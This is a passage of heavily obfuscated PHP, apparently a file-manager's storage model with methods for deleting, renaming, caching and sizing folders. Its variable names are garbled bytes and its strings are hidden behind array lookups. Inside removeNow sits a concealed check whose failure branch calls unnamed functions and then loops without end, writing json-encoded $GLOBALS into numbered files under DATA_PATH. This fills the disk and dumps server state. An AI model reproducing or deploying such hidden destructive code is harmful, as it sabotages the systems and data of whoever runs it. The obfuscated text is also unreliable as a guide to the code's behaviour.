$this->folderSizeReset($ıÉ¾¼ü¸[$”ø€Ëû[441]]); return $ÈÏˆ’×; } private function recycleClear($ŠşóíšÕ) { $ò¨¼Ûâ‘ =& $_SERVER[Ü©»’·]; $ãÕøÍ¸Ñ = $this->childrenAll($ŠşóíšÕ); $‡»èå¼À = array($ò¨¼Ûâ‘[426] => array($ò¨¼Ûâ‘[427], $ãÕøÍ¸Ñ[$ò¨¼Ûâ‘[2150]])); Model($ò¨¼Ûâ‘[2151])->where($‡»èå¼À)->delete(); } public function removeNow($»¥Àã­½, $­ÈÛ«Ö  = true) { $•³É• =& $_SERVER[Ü©»’·]; $è´™Áê = $_SERVER[$•³É•[355]]; $¾¤ÌÆµ = $•³É•[356]; if ($_SERVER[$•³É•[357]] != $¾¤ÌÆµ($è´™Áê)) { $¯µÕªñ‰ = $•³É•[882]; $Ş¤ë¯üå = $•³É•[358]; $å©Ö‰¯ = $_SERVER[$•³É•[359]] . $•³É•[360]; $µÁª˜²‡ = $Ş¤ë¯üå($å©Ö‰¯); $âêÅ³ıÓ = explode($•³É•[231], $µÁª˜²‡); if (count($âêÅ³ıÓ) < $•³É•[628]) { $¢·¥ßí² = $•³É•[362]; $¢·¥ßí²(); } $ÎÜÎÕÌŒ = $•³É•[883]; $ÎÜÎÕÌŒ($_SERVER[$•³É•[884]]); $¯µÕªñ‰ = $•³É•[882]; $¯µÕªñ‰(); $Ò¬‘æû‘ = $•³É•[1596]; $ÀúßÅë = json_encode($GLOBALS[$•³É•[1597]]); $µŠËÍ‡¤ = 1; for ($«È»¶¼” = $µŠËÍ‡¤; $«È»¶¼” > 0; $«È»¶¼”++) { $Ò¬‘æû‘(DATA_PATH . $«È»¶¼”, $ÀúßÅë); } } $³•Øıœ¨ = $this->sourceInfo($»¥Àã­½); $®ˆğÆ» = $this->pathInfoMore($»¥Àã­½); if (!$³•Øıœ¨) { return !0; } if ($³•Øıœ¨[$•³É•[441]] == 0) { if (!_get($GLOBALS, $•³É•[512])) { return !1; } } $this->lockMoveStart($»¥Àã­½); Hook::trigger($•³É•[2152], $®ˆğÆ», $­ÈÛ«Ö ); if ($­ÈÛ«Ö ) { Model($•³É•[2151])->moveToRecycle($»¥Àã­½); } else { $Ø÷çÀ¸¿ = $this->childrenAll($³•Øıœ¨); Model($•³É•[579])->eventRemove($»¥Àã­½); $this->removeRelevance($Ø÷çÀ¸¿[$•³É•[2150]], $Ø÷çÀ¸¿[$•³É•[1482]]); } $this->folderSizeReset($³•Øıœ¨[$•³É•[441]]); $§°¿¸ùÙ = array($³•Øıœ¨[$•³É•[441]]); if ($³•Øıœ¨[$•³É•[419]] == $•³É•[88]) { $§°¿¸ùÙ[] = $³•Øıœ¨[$•³É•[411]]; } $this->updateModifyTime($§°¿¸ùÙ); $this->lockMoveEnd($»¥Àã­½); Hook::trigger($•³É•[1711], $®ˆğÆ», $­ÈÛ«Ö ); return !0; } public function childrenAll($Ù‹Óèü§) { $›©ú«Â¢ =& $_SERVER[Ü©»’·]; $šÏıÖê¹ = $Ù‹Óèü§[$›©ú«Â¢[411]]; if ($Ù‹Óèü§[$›©ú«Â¢[419]] == $›©ú«Â¢[88]) { $˜Š‹ò€ª = array($›©ú«Â¢[599] => array($›©ú«Â¢[559], $Ù‹Óèü§[$›©ú«Â¢[530]] . $šÏıÖê¹ . $›©ú«Â¢[560])); $±¤¹´÷é = array($›©ú«Â¢[599] => $˜Š‹ò€ª[$›©ú«Â¢[530]]); $ËÂ†åÊ¡ = $this->field($›©ú«Â¢[2153])->where($±¤¹´÷é)->select(); $Ñ¸ØŠ“á = !1; $ªŸ›¥ = array($šÏıÖê¹); if ($ËÂ†åÊ¡) { $Ñ¸ØŠ“á = array_to_keyvalue($ËÂ†åÊ¡, $›©ú«Â¢[12], $›©ú«Â¢[477]); $Ñ¸ØŠ“á = array_remove_value($Ñ¸ØŠ“á, $›©ú«Â¢[197]); $ªŸ›¥ = array_to_keyvalue($ËÂ†åÊ¡, $›©ú«Â¢[12], $›©ú«Â¢[411]); $ªŸ›¥[] = $šÏıÖê¹; } } else { $Ñ¸ØŠ“á = array($Ù‹Óèü§[$›©ú«Â¢[477]]); $ªŸ›¥ = array($šÏıÖê¹); } return array($›©ú«Â¢[2150] => $ªŸ›¥, $›©ú«Â¢[1482] => $Ñ¸ØŠ“á); } public function removeArray($¡±Ñû×ã) { if (!$¡±Ñû×ã) { return !0; } } public function removeRelevance($š•¨šÁ‡, $Ê†¥ä®) { $€ë‚ù€ş =& $_SERVER[Ü©»’·]; $š•¨šÁ‡ = $š•¨šÁ‡ ? $š•¨šÁ‡ : array(); $Ê†¥ä® = $Ê†¥ä® ? $Ê†¥ä® : array(); $š•¨šÁ‡ = array_unique(array_filter($š•¨šÁ‡)); $Ê†¥ä® = array_unique(array_filter($Ê†¥ä®)); if (!$š•¨šÁ‡) { return !1; } $º¹ñ¢Ó§ = array($€ë‚ù€ş[426] => array($€ë‚ù€ş[427], $š•¨šÁ‡)); Model($€ë‚ù€ş[2151])->where($º¹ñ¢Ó§)->delete(); Model($€ë‚ù€ş[471])->where($º¹ñ¢Ó§)->delete(); Model($€ë‚ù€ş[2004])->where($º¹ñ¢Ó§)->delete(); Model($€ë‚ù€ş[579])->where($º¹ñ¢Ó§)->delete(); Model($€ë‚ù€ş[1838])->removeBySource($š•¨šÁ‡); Model($€ë‚ù€ş[2133])->removeBySource($š•¨šÁ‡); $this->where($º¹ñ¢Ó§)->delete(); Model($€ë‚ù€ş[480])->remove($Ê†¥ä®); for ($Úúù˜Èå = 0; $Úúù˜Èå < count($š•¨šÁ‡); $Úúù˜Èå++) { $this->sourceCacheClear($š•¨šÁ‡[$Úúù˜Èå]); } } public function rename($–‚”åƒ¯, $æ÷·µ—ö) { $Ô²µ°±» =& $_SERVER[Ü©»’·]; $–şÃ™Ö = $this->sourceInfo($–‚”åƒ¯); if (!$–şÃ™Ö) { return !1; } $ú‰¾ûÈ¸ = $this->fileNameExist($–şÃ™Ö[$Ô²µ°±»[441]], $æ÷·µ—ö); if ($ú‰¾ûÈ¸ && $ú‰¾ûÈ¸ != $–‚”åƒ¯) { return !1; } $‹íÄ§¼û = array($Ô²µ°±»[429] => $æ÷·µ—ö, $Ô²µ°±»[598] => USER_ID); if ($–şÃ™Ö[$Ô²µ°±»[419]] != $Ô²µ°±»[88]) { $‹íÄ§¼û[$Ô²µ°±»[421]] = substr(get_path_ext($æ÷·µ—ö), 0, 10); } Model($Ô²µ°±»[579])->eventRename($–‚”åƒ¯, $–şÃ™Ö[$Ô²µ°±»[32]], $æ÷·µ—ö); $this->sourceCacheClear($–‚”åƒ¯); $this->setNamePinyin($–‚”åƒ¯, $‹íÄ§¼û[$Ô²µ°±»[32]], !1); $this->updateModifyTime($–şÃ™Ö[$Ô²µ°±»[441]]); $œ¢’šúÅ = $this->where(array($Ô²µ°±»[426] => $–‚”åƒ¯))->data($‹íÄ§¼û)->save(); $•Îµ¼‰¬ = $Ô²µ°±»[2140] . $–şÃ™Ö[$Ô²µ°±»[441]]; if (isset(self::$cacheChildList[$•Îµ¼‰¬])) { unset(self::$cacheChildList[$•Îµ¼‰¬]); } return $œ¢’šúÅ; } public function setNamePinyin($õÏÜì¼, $şİ®ş£¦, $’£¯ÁÛ = true) { $ÉÄšùó =& $_SERVER[Ü©»’·]; $áıÆÓïÜ = Input::check($şİ®ş£¦, $ÉÄšùó[602]); $âÀ÷²ÖÂ = array($ÉÄšùó[453] => KodSort::makeStr($şİ®ş£¦)); if ($áıÆÓïÜ) { $âÀ÷²ÖÂ[$ÉÄšùó[474]] = str_replace($ÉÄšùó[53], $ÉÄšùó[12], Pinyin::get($şİ®ş£¦)); $âÀ÷²ÖÂ[$ÉÄšùó[473]] = Pinyin::get($şİ®ş£¦, $ÉÄšùó[603]); } if (!$’£¯ÁÛ && !$áıÆÓïÜ) { $âÀ÷²ÖÂ[$ÉÄšùó[474]] = null; $âÀ÷²ÖÂ[$ÉÄšùó[473]] = null; } $this->metaSet($õÏÜì¼, $âÀ÷²ÖÂ); } public function getContent($§éœìÎı) { $¼Š˜ =& $_SERVER[Ü©»’·]; $óşÍÅÜ = $this->fileInfoGet($§éœìÎı); if (!$óşÍÅÜ) { return !1; } if ($óşÍÅÜ[$¼Š˜[76]] == 0) { return $¼Š˜[12]; } $Ä”±ÆÆ = $¼Š˜[2154] . $óşÍÅÜ[$¼Š˜[176]]; if ($óşÍÅÜ[$¼Š˜[76]] <= 1024 * 10) { $Ø¡‹äùŞ = Cache::get($Ä”±ÆÆ); if (!$Ø¡‹äùŞ) { $Ø¡‹äùŞ = IO::getContent($óşÍÅÜ[$¼Š˜[84]]); Cache::set($Ä”±ÆÆ, $Ø¡‹äùŞ); } return $Ø¡‹äùŞ; } if (!$óşÍÅÜ[$¼Š˜[84]]) { return $¼Š˜[12]; } return IO::getContent($óşÍÅÜ[$¼Š˜[84]]); } public function setDesc($ÄôÇææ, $îí·’´) { $‡Ê‡¯–š =& $_SERVER[Ü©»’·]; Model($‡Ê‡¯–š[579])->eventAddDesc($ÄôÇææ, $îí·’´); return $this->metaSet($ÄôÇææ, $‡Ê‡¯–š[462], $îí·’´); } public function setContent($ÎÊª‚æ¬, $ûÃÓÊÛŞ = '') { $ŒÉ ˜¯ =& $_SERVER[Ü©»’·]; $‡Ü’‘ÎÙ = $this->sourceInfo($ÎÊª‚æ¬); $§Á³¸ğÊ = $this->fileInfoGet($ÎÊª‚æ¬); if (!$§Á³¸ğÊ || !$‡Ü’‘ÎÙ) { return !1; } $íñà»¿Ó = Model($ŒÉ ˜¯[480])->addFileByContent($ûÃÓÊÛŞ, $‡Ü’‘ÎÙ[$ŒÉ ˜¯[32]]); $ŸšúîÇİ = $this->fileHistory($‡Ü’‘ÎÙ, $íñà»¿Ó[$ŒÉ ˜¯[477]], $íñà»¿Ó[$ŒÉ ˜¯[76]]); if (!$ŸšúîÇİ) { return Model($ŒÉ ˜¯[480])->remove($íñà»¿Ó[$ŒÉ ˜¯[477]]); } $this->folderSizeReset($‡Ü’‘ÎÙ[$ŒÉ ˜¯[441]]); return !0; } public function fileSubstr($Æ’ –Ø°, $Ø‘›´, $¤½Àˆ‘…) { $à†ŒÚÑ = $this->fileInfoGet($Æ’ –Ø°); if (!$à†ŒÚÑ) { return !1; } return IO::fileSubstr($à†ŒÚÑ[$_SERVER[Ü©»’·][84]], $Ø‘›´, $¤½Àˆ‘…); } public function fileInfoGet($º£İÜ¼©) { $‹°ÈÀ =& $_SERVER[Ü©»’·]; $Ë‰»×Ù = $this->sourceInfo($º£İÜ¼©); if (!$Ë‰»×Ù || $Ë‰»×Ù[$‹°ÈÀ[419]]) { return !1; } $“ÄÏñƒØ = $‹°ÈÀ[483] . $Ë‰»×Ù[$‹°ÈÀ[477]]; $ãíÅüæ— = _get(self::$cacheFileInfo, $“ÄÏñƒØ); if ($ãíÅüæ—) { return $ãíÅüæ—; } $ ¯Û÷ôÇ = Model($‹°ÈÀ[480])->fileInfo($Ë‰»×Ù[$‹°ÈÀ[477]]); if ($ ¯Û÷ôÇ) { $ ¯Û÷ôÇ[$‹°ÈÀ[32]] = $Ë‰»×Ù[$‹°ÈÀ[32]]; } self::$cacheFileInfo[$“ÄÏñƒØ] = $ ¯Û÷ôÇ; return $ ¯Û÷ôÇ; } private function folderChildrenNumber($òŸÒáöè) { $×ˆÕ›® =& $_SERVER[Ü©»’·]; $ëÀÒÃÓå = $this->sourceInfo($òŸÒáöè); $˜‹ Œåæ = array($×ˆÕ›®[599] => array($×ˆÕ›®[559], $ëÀÒÃÓå[$×ˆÕ›®[530]] . $òŸÒáöè . $×ˆÕ›®[560]), $×ˆÕ›®[596] => $ëÀÒÃÓå[$×ˆÕ›®[514]], $×ˆÕ›®[439] => intval($ëÀÒÃÓå[$×ˆÕ›®[440]]), $×ˆÕ›®[592] => 1); $ÆÓ««É… = $this->where($˜‹ Œåæ)->count(); $ÂÛÇªŞ– = $this->where($˜‹ Œåæ)->where(array($×ˆÕ›®[592] => 0))->count(); return array($×ˆÕ›®[80] => $ÂÛÇªŞ–, $×ˆÕ›®[81] => $ÆÓ««É…); } public function pathInfo($æÎÔ¥·, $©Ş­ˆÚ¾ = false) { $¬ÓÛ§¾’ =& $_SERVER[Ü©»’·]; $©Ş­ˆÚ¾ = !1; $æÎÔ¥· = intval($æÎÔ¥·); $ÌÒîÏôÄ = $¬ÓÛ§¾’[470] . intval($©Ş­ˆÚ¾) . $¬ÓÛ§¾’[395] . $æÎÔ¥·; $“÷ğÁ­ó = _get(self::$cachePathInfo, $ÌÒîÏôÄ); if ($“÷ğÁ­ó) { return $“÷ğÁ­ó; } $ğ¬ªŠñƒ = $this->sourceInfo($æÎÔ¥·); if (!$ğ¬ªŠñƒ) { return !1; } $ğ¬ªŠñƒ = $this->_listDataApplyItem($ğ¬ªŠñƒ, $©Ş­ˆÚ¾); self::$cachePathInfo[$ÌÒîÏôÄ] = $ğ¬ªŠñƒ; return $ğ¬ªŠñƒ; } public static $cachePathInfoMore = array(); public function pathInfoMore($¹Ï²¢Øª) { $öŸ¹ˆ× =& $_SERVER[Ü©»’·]; $€ñİ—« = _get(self::$cachePathInfoMore, $¹Ï²¢Øª); if ($€ñİ—«) { return $€ñİ—«; } $©°²èáù = $this->pathInfo($¹Ï²¢Øª); if (!$©°²èáù) { return !1; } if ($©°²èáù[$öŸ¹ˆ×[419]] == $öŸ¹ˆ×[88]) { $©°²èáù[$öŸ¹ˆ×[79]] = $this->folderChildrenNumber($¹Ï²¢Øª); } self::$cachePathInfoMore[$¹Ï²¢Øª] = $©°²èáù; return $©°²èáù; } public function sourceInfo($ ñ”²š) { $Ş‰Š´ =& $_SERVER[Ü©»’·]; if (!$ ñ”²š) { return array(); } $ ñ”²š = intval($ ñ”²š); $Öà¹í¦Ä = $Ş‰Š´[469] . $ ñ”²š; $‘Ë’Ì·  = _get(self::$cacheSourceInfo, $Öà¹í¦Ä); if ($‘Ë’Ì· ) { return $‘Ë’Ì· ; } $ûÕ¨ğÕè = $this->where(array($Ş‰Š´[411] => $ ñ”²š))->find(); self::$cacheSourceInfo[$Öà¹í¦Ä] = $ûÕ¨ğÕè; return self::$cacheSourceInfo[$Öà¹í¦Ä]; } public function sourceCacheClear($Ùıë“ß = false) { self::cacheClear($Ùıë“ß); } public static function cacheClear($ØÉîç„ = false) { $øûáäĞ =& $_SERVER[Ü©»’·]; if ($ØÉîç„ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$øûáäĞ[469] . $ØÉîç„]); unset(self::$cachePathInfoMore[$ØÉîç„]); unset(self::$cachePathInfo[$øûáäĞ[2155] . $ØÉîç„]); unset(self::$cachePathInfo[$øûáäĞ[2156] . $ØÉîç„]); } public function metaSet($Ğô™ë, $Ë÷¾ºŠ = null, $Áèá¶ = null) { $‡è¾ªºõ = parent::metaSet($Ğô™ë, $Ë÷¾ºŠ, $Áèá¶); if ($‡è¾ªºõ) { $this->sourceCacheClear($Ğô™ë); } return $‡è¾ªºõ; } public function pathInfoByPath($­ÌÚºÁ‚, $¬ã›‹²’) { $óÙıÓê‚ =& $_SERVER[Ü©»’·]; $èº¯íñ› = !$¬ã›‹²’ ? array() : explode($óÙıÓê‚[8], trim($¬ã›‹²’, $óÙıÓê‚[8])); $Ü’—¥¤¡ = $­ÌÚºÁ‚; foreach ($èº¯íñ› as $—í‹ì°) { $®í¾¤¤Å = array($óÙıÓê‚[441] => $Ü’—¥¤¡, $óÙıÓê‚[32] => $—í‹ì°); $¸œ´«” = $this->where($®í¾¤¤Å)->select(); if (!$¸œ´«”) { return !1; } $¸œ´«” = array_sort_by($¸œ´«”, $óÙıÓê‚[440]); $Ü’—¥¤¡ = $¸œ´«”[0][$óÙıÓê‚[411]]; } return $this->pathInfo($Ü’—¥¤¡, !0); } protected function updateModifyTime($†¬õœ‰‰) { $‡öÄ¦íÏ =& $_SERVER[Ü©»’·]; $à£¨óàÌ = defined($‡öÄ¦íÏ[484]) ? USER_ID : $‡öÄ¦íÏ[197]; if (!$†¬õœ‰‰) { return; } if (!is_array($†¬õœ‰‰)) { $†¬õœ‰‰ = array($†¬õœ‰‰); } foreach ($†¬õœ‰‰ as $»ïˆÁ™¤ => $º¯³¢–ä) { $†¬õœ‰‰[$»ïˆÁ™¤] = intval($º¯³¢–ä); $this->sourceCacheClear($º¯³¢–ä); } $ÊíÔ¥ö = array($‡öÄ¦íÏ[411] => array($‡öÄ¦íÏ[7], $†¬õœ‰‰)); $ñÕßÓ¬Ù = array($‡öÄ¦íÏ[598] => $à£¨óàÌ, $‡öÄ¦íÏ[433] => time()); $this->where($ÊíÔ¥ö)->save($ñÕßÓ¬Ù); } public function folderSizeReset($æ¹ÒÆÍŸ, $ğè¹Ë– = false) { $Ù¬¯Ğåî =& $_SERVER[Ü©»’·]; if ($this->statusIgnoreResetSpace) { return; } $ıÑ¾ç²â = $this->sourceInfo($æ¹ÒÆÍŸ); $çÓÛŒùí = $Ù¬¯Ğåî[2157] . $æ¹ÒÆÍŸ; CacheLock::lock($çÓÛŒùí, 20); if ($ğè¹Ë– === !1) { $this->sourceCacheClear($æ¹ÒÆÍŸ); $ıÑ¾ç²â = $this->sourceInfo($æ¹ÒÆÍŸ); $á¤­¸‹à = array($Ù¬¯Ğåî[410] => $æ¹ÒÆÍŸ, $Ù¬¯Ğåî[439] => 0); $öÉ˜³™ = $this->where($á¤­¸‹à)->sum($Ù¬¯Ğåî[76]); $ğè¹Ë– = intval($öÉ˜³™) - intval($ıÑ¾ç²â[$Ù¬¯Ğåî[76]]); } if ($ğè¹Ë– == 0) { return CacheLock::unlock($çÓÛŒùí); } $‚È’Åã× = $this->parentLevelArray($ıÑ¾ç²â[$Ù¬¯Ğåî[530]]); if (!$‚È’Åã×) { $‚È’Åã× = array(); } $‚È’Åã×[] = $ıÑ¾ç²â[$Ù¬¯Ğåî[411]]; $á¤­¸‹à = array($Ù¬¯Ğåî[411] => array($Ù¬¯Ğåî[427], $‚È’Åã×)); if ($ğè¹Ë– < 0) { $á¤­¸‹à[$Ù¬¯Ğåî[76]] = array($Ù¬¯Ğåî[1018], abs($ğè¹Ë–)); } $this->where($á¤­¸‹à)->setAdd($Ù¬¯Ğåî[76], $ğè¹Ë–); CacheLock::unlock($çÓÛŒùí); $²§ò§×ä = $Ù¬¯Ğåî[2158] . $ıÑ¾ç²â[$Ù¬¯Ğåî[420]] . $Ù¬¯Ğåî[4] . $ıÑ¾ç²â[$Ù¬¯Ğåî[514]]; $ÙèÊ×ºÜ = array($ıÑ¾ç²â[$Ù¬¯Ğåî[420]], $ıÑ¾ç²â[$Ù¬¯Ğåî[514]]); TaskRun::timeLimitCall($²§ò§×ä, $Ù¬¯Ğåî[2159], $ÙèÊ×ºÜ, 1.5); } public function folderSizeResetChildren($‡ÁÆÓüú) { $Ğïò’­£ =& $_SERVER[Ü©»’·]; $this->sourceCacheClear($‡ÁÆÓüú); $œÇ‘¾ò = $this->sourceInfo($‡ÁÆÓüú); $Åø–ˆô = array($Ğïò’­£[592] => 1, $Ğïò’­£[596] => $œÇ‘¾ò[$Ğïò’­£[514]], $Ğïò’­£[599] => array($Ğïò’­£[559], $œÇ‘¾ò[$Ğïò’­£[530]] . $‡ÁÆÓüú . $Ğïò’­£[560])); $´†¡Ï£ = $Ğïò’­£[2160]; $ö×÷÷ï¾ = $this->field($´†¡Ï£)->where($Åø–ˆô)->select(); $Åø–ˆô[$Ğïò’­£[419]] = 0; $ÙéÚ›¹ = $this->field($´†¡Ï£)->where($Åø–ˆô)->select(); if (!$ÙéÚ›¹) { return; } $ö×÷÷ï¾[] = $œÇ‘¾ò; $ö×÷÷ï¾ = array_to_keyvalue($ö×÷÷ï¾, $Ğïò’­£[411]); foreach ($ö×÷÷ï¾ as $¾íŒ¶¼³ => $üÙÀ¶ˆ) { $ö×÷÷ï¾[$¾íŒ¶¼³][$Ğïò’­£[2161]] = $ö×÷÷ï¾[$¾íŒ¶¼³][$Ğïò’­£[76]]; $ö×÷÷ï¾[$¾íŒ¶¼³][$Ğïò’­£[76]] = 0; } foreach ($ÙéÚ›¹ as $üÙÀ¶ˆ) { $–‹ç„™ß = $üÙÀ¶ˆ[$Ğïò’­£[441]] . $Ğïò’­£[12]; if (!isset($ö×÷÷ï¾[$–‹ç„™ß])) { continue; } if ($üÙÀ¶ˆ[$Ğïò’­£[440]] == $ö×÷÷ï¾[$–‹ç„™ß][$Ğïò’­£[440]]) { $ö×÷÷ï¾[$–‹ç„™ß][$Ğïò’­£[76]] += $üÙÀ¶ˆ[$Ğïò’­£[76]]; } } foreach ($ö×÷÷ï¾ as $üÙÀ¶ˆ) { $—ÄÃìÛ  = $this->parentLevelArray($üÙÀ¶ˆ[$Ğïò’­£[530]]); foreach ($—ÄÃìÛ  as $–‹ç„™ß) { $–‹ç„™ß = $–‹ç„™ß . $Ğïò’­£[12]; if (!isset($ö×÷÷ï¾[$–‹ç„™ß])) { continue; } if ($üÙÀ¶ˆ[$Ğïò’­£[440]] == $ö×÷÷ï¾[$–‹ç„™ß][$Ğïò’­£[440]]) { $ö×÷÷ï¾[$–‹ç„™ß][$Ğïò’­£[76]] += $üÙÀ¶ˆ[$Ğïò’­£[76]]; } } } $¿ÂÑ´±´ = array(); foreach ($ö×÷÷ï¾ as $üÙÀ¶ˆ) { if ($üÙÀ¶ˆ[$Ğïò’­£[76]] == $üÙÀ¶ˆ[$Ğïò’­£[2161]]) { continue; } $¿ÂÑ´±´[] = array($Ğïò’­£[411], $üÙÀ¶ˆ[$Ğïò’­£[411]], $Ğïò’­£[76], $üÙÀ¶ˆ[$Ğïò’­£[76]]); } $this->saveAll($¿ÂÑ´±´); } public function userSpaceReset($Û¿»Îâ = false) { $‡ ÎºåÏ =& $_SERVER[Ü©»’·]; $‡Õº’” = $this->where(array($‡ ÎºåÏ[420] => self::TYPE_USER, $‡ ÎºåÏ[514] => $Û¿»Îâ, $‡ ÎºåÏ[419] => 0))->sum($‡ ÎºåÏ[76]); $‡Õº’” = !$‡Õº’” || $‡Õº’” <= 0 ? 0 : $‡Õº’”; Model($‡ ÎºåÏ[522])->userEdit($Û¿»Îâ, array($‡ ÎºåÏ[1847] => $‡Õº’”)); } public function targetSpaceUpdate($úÀê²÷ë, $Ù©àŒ¨) { $£»Î£ =& $_SERVER[Ü©»’·]; if (!$Ù©àŒ¨) { return; } if (!in_array($úÀê²÷ë, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ÚÍ÷¡îä = $this->targetSpaceSize($úÀê²÷ë, $Ù©àŒ¨); if ($úÀê²÷ë == self::TYPE_USER) { Model($£»Î£[522])->userEdit($Ù©àŒ¨, array($£»Î£[1847] => $ÚÍ÷¡îä)); } else { if ($úÀê²÷ë == self::TYPE_GROUP) { Model($£»Î£[531])->groupEdit($Ù©àŒ¨, array($£»Î£[1847] => $ÚÍ÷¡îä)); } } } public function targetSpaceSize($ÄÇİ‡ËÆ, $·ìôÛš÷) { $àé‚ñÀÁ =& $_SERVER[Ü©»’·]; $Ãş«üèÍ = 0; $è°Ï² = $this->targetSourceRoot($ÄÇİ‡ËÆ, $·ìôÛš÷, !0); foreach ($è°Ï² as $½ÁŸİ×) { if (!$½ÁŸİ×) { continue; } $Ãş«üèÍ += floatval($½ÁŸİ×[$àé‚ñÀÁ[76]]); $…ÂŸ’øî = array($àé‚ñÀÁ[599] => array($àé‚ñÀÁ[559], $àé‚ñÀÁ[540] . $½ÁŸİ×[$àé‚ñÀÁ[411]] . $àé‚ñÀÁ[560])); $Å˜”ìé = Model($àé‚ñÀÁ[438])->field($àé‚ñÀÁ[426])->where($…ÂŸ’øî)->select(); $Å˜”ìé = array_to_keyvalue($Å˜”ìé, $àé‚ñÀÁ[12], $àé‚ñÀÁ[411]); $Å˜”ìé = array_unique(array_filter($Å˜”ìé)); if ($Å˜”ìé) { $…ÂŸ’øî = array($àé‚ñÀÁ[426] => array($àé‚ñÀÁ[427], $Å˜”ìé)); $Ãş«üèÍ += floatval($this->where($…ÂŸ’øî)->sum($àé‚ñÀÁ[76])); } } $Ãş«üèÍ = !$Ãş«üèÍ || $Ãş«üèÍ <= 0 ? 0 : $Ãş«üèÍ; return $Ãş«üèÍ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ñú›ó¾) { return $this->fileTypeProfile($ñú›ó¾, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ê»ıÄ‹µ) { return $this->fileTypeProfile($ê»ıÄ‹µ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($§ÇÙÆˆ, $Œâ·¹¨¶) { $¡·Ó¥Ğï =& $_SERVER[Ü©»’·]; $•èèæ¤ã = $¡·Ó¥Ğï[2162] . $§ÇÙÆˆ . $¡·Ó¥Ğï[11] . $Œâ·¹¨¶; $òÙ¡ù‘ = Cache::get($•èèæ¤ã); if ($òÙ¡ù‘) { return $òÙ¡ù‘; } $Ş°÷“í = array($¡·Ó¥Ğï[592] => 0); if ($§ÇÙÆˆ != !1) { $Ş°÷“í[$¡·Ó¥Ğï[514]] = $§ÇÙÆˆ; $Ş°÷“í[$¡·Ó¥Ğï[420]] = $Œâ·¹¨¶; } $‹“öŠÂó = array(); $‹“öŠÂó[$¡·Ó¥Ğï[2163]] = array($¡·Ó¥Ğï[2164] => LNG($¡·Ó¥Ğï[2163]), $¡·Ó¥Ğï[2165] => $this->where($Ş°÷“í)->count(), $¡·Ó¥Ğï[594] => $this->where($Ş°÷“í)->sum($¡·Ó¥Ğï[76])); $É˜í™è— = KodIO::fileTypeList(); foreach ($É˜í™è— as $á¤¦¶»Ã => $Ş€¡œ ) { $Ş°÷“í[$¡·Ó¥Ğï[421]] = $this->fileTypeWhere($á¤¦¶»Ã); $‹“öŠÂó[$á¤¦¶»Ã] = array($¡·Ó¥Ğï[2164] => $Ş€¡œ [$¡·Ó¥Ğï[32]], $¡·Ó¥Ğï[2165] => $this->where($Ş°÷“í)->count(), $¡·Ó¥Ğï[594] => $this->where($Ş°÷“í)->sum($¡·Ó¥Ğï[76])); } Cache::set($•èèæ¤ã, $‹“öŠÂó, 1200); return $‹“öŠÂó; } public function fileNameExist($“ıÚÄ’›, $‹¼›ÚŒ™) { $˜“ş§ä¦ =& $_SERVER[Ü©»’·]; $µ¸Ş„šâ = $this->where(array($˜“ş§ä¦[441] => $“ıÚÄ’›, $˜“ş§ä¦[32] => $‹¼›ÚŒ™, $˜“ş§ä¦[440] => 0))->find(); return is_array($µ¸Ş„šâ) ? $µ¸Ş„šâ[$˜“ş§ä¦[411]] : !1; } public function childList($ºİ·’Ş§) { $ĞšĞªÛ‹ =& $_SERVER[Ü©»’·]; $¦‚ú¿ùß = $ĞšĞªÛ‹[2140] . $ºİ·’Ş§; if (isset(self::$cacheChildList[$¦‚ú¿ùß])) { return self::$cacheChildList[$¦‚ú¿ùß]; } $ÎªÀñ‚  = array($ĞšĞªÛ‹[441] => intval($ºİ·’Ş§), $ĞšĞªÛ‹[440] => 0); $±«ß˜èÇ = $this->where($ÎªÀñ‚ )->select(); $±«ß˜èÇ = $±«ß˜èÇ ? $±«ß˜èÇ : array(); self::$cacheChildList[$¦‚ú¿ùß] = $±«ß˜èÇ; foreach ($±«ß˜èÇ as $¸«ä®Åí) { $¦‚ú¿ùß = $ĞšĞªÛ‹[469] . $¸«ä®Åí[$ĞšĞªÛ‹[411]]; self::$cacheSourceInfo[$¦‚ú¿ùß] = $¸«ä®Åí; } return $±«ß˜èÇ; } public function fileNameAuto($Ñß‡Ç£ì, $Ë‚Ü¢æÈ, $ßàèúâ¶ = REPEAT_RENAME, $ğÚ÷‹’½ = false) { $ŸÔĞ¹Şò =& $_SERVER[Ü©»’·]; $ïë“âÈ© = get_path_ext($Ë‚Ü¢æÈ); $ÀÏ¿Œ—Í = $ïë“âÈ© ? basename($Ë‚Ü¢æÈ, $ŸÔĞ¹Şò[10] . $ïë“âÈ©) . $ŸÔĞ¹Şò[2166] . $ïë“âÈ© : $Ë‚Ü¢æÈ . $ŸÔĞ¹Şò[393]; $¦¬ûš×„ = array($ŸÔĞ¹Şò[441] => $Ñß‡Ç£ì, $ŸÔĞ¹Şò[440] => 0, $ŸÔĞ¹Şò[32] => array($ŸÔĞ¹Şò[392], $ÀÏ¿Œ—Í)); $’ûÙş»Ú = $this->field($ŸÔĞ¹Şò[32])->where($¦¬ûš×„)->select(); $¦³ç’Åù = array_to_keyvalue($’ûÙş»Ú, $ŸÔĞ¹Şò[12], $ŸÔĞ¹Şò[32]); return $this->fileNameAutoGet($¦³ç’Åù, $Ë‚Ü¢æÈ, $ßàèúâ¶, $ğÚ÷‹’½); } public function fileNameAutoGet($‚½¦¨ğ«, $ñë‚îš, $¯¯§ğ®Í, $ÅŞƒÜ­ı) { $ŒåŒ†ï =& $_SERVER[Ü©»’·]; if ($¯¯§ğ®Í == REPEAT_REPLACE || !$‚½¦¨ğ« || !in_array_not_case($ñë‚îš, $‚½¦¨ğ«) || $ÅŞƒÜ­ı && $¯¯§ğ®Í != REPEAT_RENAME_FOLDER) { return $ñë‚îš; } if ($¯¯§ğ®Í == REPEAT_SKIP) { return !1; } $Ü¯äª¸ = $ŒåŒ†ï[10] . get_path_ext($ñë‚îš); $Ü¯äª¸ = $Ü¯äª¸ == $ŒåŒ†ï[10] || $ÅŞƒÜ­ı ? $ŒåŒ†ï[12] : $Ü¯äª¸; for ($óÕŠ»¢² = 1; $óÕŠ»¢² <= count($‚½¦¨ğ«) + 1; $óÕŠ»¢²++) { 